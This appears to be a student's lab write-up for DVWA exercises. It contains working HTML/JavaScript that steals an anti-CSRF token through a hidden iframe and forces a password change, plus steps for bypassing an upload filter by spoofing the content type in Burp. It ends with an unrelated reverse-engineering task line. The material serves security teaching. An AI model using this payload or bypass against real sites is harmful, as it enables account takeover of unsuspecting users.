# Part 1 - Advanced Web Exploits

> [!exercise] Exercise 1 - CSRF Token Stealing
>
> When on the high-security setting of DVWA, a unique ANTI-CSRF token is created each time the password change page is accessed, as shown in the workshop. To launch a CSRF attack in this case, we first need to steal the token. Create an HTML (name it: 'csrf.html') file that can steal the token from the DVWA CSRF page and change the password to 'csf2024s1'.
>
> **Answer:**
>
> The default `html` file already does the stealing for us, we just need to add the `hacklab IP` to the `source` and `url` variables.
>
> ```html
> <html>
> <body>
>     <p>TOTALLY LEGITIMATE AND SAFE WEBSITE </p>
>     <iframe id="myFrame" src="http://192.168.56.102/DVWA/vulnerabilities/csrf/" style="visibility: hidden;"
>         onload="maliciousPayload()"></iframe>
>     <script>
>         function maliciousPayload() {
>             console.log("start");
>             var iframe = document.getElementById("myFrame");
>             var doc = iframe.contentDocument;
>             var token = doc.getElementsByName("user_token")[0].value;
>             const http = new XMLHttpRequest();
>             const url = "http://192.168.56.102/DVWA/vulnerabilities/csrf/?password_new=csf2024s1&password_conf=csf2024s1&Change=Change&user_token=" + token + "#";
>             http.open("GET", url);
>             http.send();
>             console.log("password changed");
>         }
>     </script>
> </body>
> </html>
> ```

# Exercise 2

> [!exercise] Exercise 2 - Uploading the CSRF File
>
> Set the DVWA security level to MEDIUM. Upload the csrf.html file to the "hackable/uploads/" folder. Provide details of the steps you use to upload the HTML file with the security level set at medium.
>
> **Answer:**
>
> This was the exact same exercise from the workshop. Since the file upload only takes images, we simply intercept the packet in burp, change the content type to `image/jpeg` and forward it! 
>

> 
> If we navigate to `<hacklab>/DVWA/hackable/uploads`, we can see the `html` file inside the directory.

# Exercise 3

> [!exercise] Exercise 3 - Triggering the Malicious HTML
>
> Show that after a user visits `http://[hacklabvm_ip]/hackable/uploads/csrf.html`, the password changes to 'csf2024s1'. Explain what happened.
>
> **Answer:**
>
> Clicking on the `csrf.html` file inside the uploads directory, we can see that the malicious script has executed and the password has been changed!
> 
> ![[Pasted image 20240515074706.png]]
> 
> The HTML code creates an invisible `iframe` that loads the DVWA CSRF page. When the `iframe` loads, it **triggers a function that steals the CSRF token from the page, constructs a malicious password change URL with the stolen token, and sends the request to change the password** to "csf2024s1" without the user's knowledge.
> 
> Modern browsers enforce the Same-Origin Policy (SOP) by default, which prevents malicious requests originating from domains other than the main website. To bypass this security measure, the **malicious HTML file needs to be hosted on the same domain as the target website**. That's why the **file is uploaded to the hacklab itself**, ensuring that the attack originates from the same domain and successfully changes the password.

You are not allowed to patch this program. Use Ghidra, Cutter, or Radare2 (or something else) to decompile and deduce the password required for revealing the secret. Get the program to print the secret.
